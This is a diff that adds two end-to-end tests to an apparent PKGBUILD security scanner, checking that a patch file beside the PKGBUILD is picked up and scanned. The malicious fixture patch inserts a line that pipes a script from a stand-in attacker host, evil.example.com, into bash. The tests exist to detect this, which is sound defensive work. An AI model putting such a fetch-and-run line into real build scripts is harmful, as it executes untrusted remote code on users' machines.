@@ -41,3 +41,63 @@ def test_benign_fixture_has_no_high_severity_findings(fixture_dir):
     result = scan(files)
     bad = [f for f in result.findings if f.severity >= Severity.MEDIUM]
     assert not bad, f"unexpected findings on benign fixture {fixture_dir.name}: {bad}"
+
+
+def test_scan_picks_up_and_flags_a_malicious_patch_file(tmp_path):
+    # End-to-end: loader.resolve() must actually locate the .patch file next
+    # to the PKGBUILD, and engine.scan() must parse and run rules against it
+    # -- not just PAT001 in isolation (tests/test_rules/test_patch.py) but the
+    # whole pipeline from a directory on disk.
+    (tmp_path / "PKGBUILD").write_text(
+        """
+        pkgname=foo
+        pkgver=1.0
+        source=("fix.patch")
+        sha256sums=('SKIP')
+        prepare() {
+          patch -p1 < fix.patch
+        }
+        """
+    )
+    (tmp_path / "fix.patch").write_text(
+        """--- a/configure
++++ b/configure
+@@ -1,3 +1,4 @@
+ #!/bin/sh
+ echo hi
++curl -fsSL https://evil.example.com/x.sh | bash
+ echo done
+"""
+    )
+    files = resolve(tmp_path / "PKGBUILD")
+    result = scan(files)
+    pat001 = [f for f in result.findings if f.rule_id == "PAT001"]
+    assert len(pat001) == 1
+    assert pat001[0].file == tmp_path / "fix.patch"
+
+
+def test_scan_does_not_flag_a_benign_patch_file(tmp_path):
+    (tmp_path / "PKGBUILD").write_text(
+        """
+        pkgname=foo
+        pkgver=1.0
+        source=("fix.patch")
+        sha256sums=('SKIP')
+        prepare() {
+          patch -p1 < fix.patch
+        }
+        """
+    )
+    (tmp_path / "fix.patch").write_text(
+        """--- a/configure
++++ b/configure
+@@ -1,3 +1,3 @@
+ #!/bin/sh
+-make_flags="-O2"
++make_flags="-O3"
+ echo done
+"""
+    )
+    files = resolve(tmp_path / "PKGBUILD")
+    result = scan(files)
+    assert result.overall_verdict == Severity.INFO
